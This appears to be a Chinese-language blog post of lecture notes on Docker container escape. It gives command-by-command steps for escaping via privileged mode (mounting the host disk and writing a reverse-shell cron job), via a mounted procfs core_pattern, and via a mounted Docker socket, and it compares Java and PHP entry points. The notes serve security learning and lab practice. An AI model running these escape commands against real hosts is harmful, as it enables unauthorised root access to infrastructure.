---
title: "Docker安全：容器逃逸、特权模式、危险挂载"
pubDate: 2026-08-17
tags:
  - 安全
  - Docker
---

云原生第一讲。Docker 容器类比"某个应用的虚拟机"，拿到容器权限只是在虚拟空间里玩，要危害物理机就得容器逃逸。三大组件：镜像（模板）、容器（运行实例）、仓库（存镜像）

## 判断是否在容器里

拿到权限后：

```shell
ls -al /                      # 根目录有 .dockerenv 就是容器（最准）
cat /proc/1/cgroup            # 有 docker/kubepods 字样是容器/K8S，虚拟机是 / 或 qemu 字样
```

没拿到权限前只能凭经验猜：非正常端口、版本异常稳定或过老

## 逃逸三条路

1. **特权模式启动**：开发者 `--privileged=true` 不安全启动，和版本无关
2. **危险挂载启动**：挂了不该挂的宿主机目录/文件，和版本无关
3. **Docker 自身版本漏洞&内核漏洞**：和软件/系统版本有关（下一讲）

前两个不算漏洞，是启动姿势问题；Java/ASP 入口默认 root 高权限直接能逃，PHP/Python 默认 www-data 低权限要先提权

## 特权模式逃逸

启动复现环境：`docker run --rm --privileged=true -it alpine`

判断特权：`cat /proc/self/status | grep CapEff`，掩码是 `0000003fffffffff` 或 `0000001fffffffff` 就是特权模式

逃逸四步：

```shell
fdisk -l                                              # 看宿主机磁盘分区
cat /proc/mounts | awk '$1~/\/dev\/sda[0-9]/ {print $1}'  # 找已挂载的分区（如 sda3）
mkdir /test && mount /dev/sda3 /test                  # 挂到容器里，/test 就是宿主机根目录
echo '反弹shell的crontab' >> /test/var/spool/cron/crontabs/root   # 写计划任务逃逸
```

也可以 `mount /dev/sda3 /mnt && chroot /mnt adduser john` 创建新用户登宿主机

## 挂载 Procfs 逃逸

procfs 是伪文件系统，动态反映系统进程状态，里面有敏感文件。启动：`docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu`

流程：

1. `find / -name core_pattern` 找到两个 core_pattern 文件 → 挂载了宿主机 procfs
2. `cat /proc/mounts | xargs -d ',' -n 1 | grep workdir` 找容器在宿主机的绝对路径（overlay2 路径，/work 改成 /merged）
3. 写 python 反弹 shell 脚本到 /tmp/.x.py，chmod 777
4. `echo -e "|容器绝对路径/tmp/.x.py \rcore" > /host/proc/sys/kernel/core_pattern`（空格格式不能动）
5. 攻击机 nc 监听，容器里编译执行崩溃程序（空指针 C 程序）触发 core dump → 宿主机以 root 执行反弹脚本

（作者复现反弹没成功，思路正确，环境细节问题）

## 挂载 Docker Socket 逃逸

Socket 用来和守护进程通信。启动：`docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu`

检测：`ls -lah /var/run/docker.sock` 存在即可能中招。容器内装 docker 客户端（curl get.docker.com | sh），然后：

```shell
docker run -it -v /:/host ubuntu /bin/bash   # 新建容器并挂载宿主机根目录
```

新容器里的 /host 就是宿主机全盘文件，逃逸完成

## 权限高低决定成败（实战对比）

- **Java（Shiro）入口**：`docker run --privileged=true vulfocus/shiro-721` → 工具一把梭拿权限 → 默认 root → fdisk/mount 直接逃逸成功
- **PHP（DVWA）入口**：上传拿 shell → 默认 www-data 低权限 → mount/fdisk 没权限执行 → 逃逸失败，得先提权

## 要点

进容器先跑三件套：.dockerenv 判断容器、CapEff 判断特权、docker.sock/procfs 判断危险挂载。特权模式逃逸最简单（挂磁盘写 cron），Socket 逃逸最稳（新起容器挂宿主机的 /），procfs 最繁琐（core_pattern 触发）。逃逸前提是容器内 root 权限——Java 入口天然优势，PHP/Python 要先提权
